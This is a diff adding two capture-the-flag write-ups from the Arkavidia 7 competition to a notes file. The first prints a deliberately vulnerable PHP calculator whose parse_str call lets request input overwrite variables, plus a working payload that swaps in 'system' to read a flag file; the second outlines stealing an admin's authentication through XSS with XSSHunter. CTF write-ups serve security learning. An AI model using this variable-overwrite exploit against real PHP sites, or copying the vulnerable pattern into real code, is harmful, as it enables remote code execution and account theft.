@@ -562,9 +562,73 @@ puts Base64.encode64(payload)
 And enter the base64 encoded payload and we got our command working.
 
 
+## parse_str variable overwrite leads to RCE (Arkavidia 7)
+Vulnerable code:
 
+```php
+<?php
+error_reporting(0);
 
+if ($_GET['debug']) {
+    highlight_file(__FILE__);
+    return;
+}
 
+$calculate = function($a, $b) {
+    return $a + $b;
+};
+
+$param = parse_str(file_get_contents("php://input"));
+
+if ($param['a']) {
+    $a = $param['a'];
+}
+
+if ($param['b']) {
+    $b = $param['b'];
+}
+
+if ($a && $b) {
+    $result = $calculate($a, $b);
+}
+?>
+<html>
+    <head>
+        <title>The Ultimate Sum Calculator-inator</title>
+    </head>
+    <body>
+        <h1>The Ultimate Sum Calculator-inator</h1>
+        <form method="post">
+            <input name="a" type="text" placeholder="First number" />
+            <div style="height: 4px"></div>
+            <input name="b" type="text" placeholder="Second number" />
+            <br /><br />
+            <input type="submit" value="Calculate" />
+        </form>
+        <?php if ($result) echo "The result is $result"; ?>
+    </body>
+    <!-- ?debug=1 -->
+</html>
+```
+
+We can use this exploit to overwrite the `calculate` variable to `system` and triggers code execution:
+
+```
+calculate=system&&a=cat /.flag/flag.txt&&b=dummy
+```
+
+The result:
+
+<a href="/assets/images/ctf/arkav7/1.png"><img src="/assets/images/ctf/arkav7/1.png"></a>
+
+## XSS steal admin auth (Arkavidia 7)
+Open [XSSHunter](https://xsshunter.com/app) and use the payload and send it to `admin`. Wait for admin to visit our payload and we got the result.
+
+<a href="/assets/images/ctf/arkav7/3.jpg"><img src="/assets/images/ctf/arkav7/3.jpg"></a>
+
+Follow the link and we got the flag.
+
+<a href="/assets/images/ctf/arkav7/2.jpg"><img src="/assets/images/ctf/arkav7/2.jpg"></a>
 
 
 
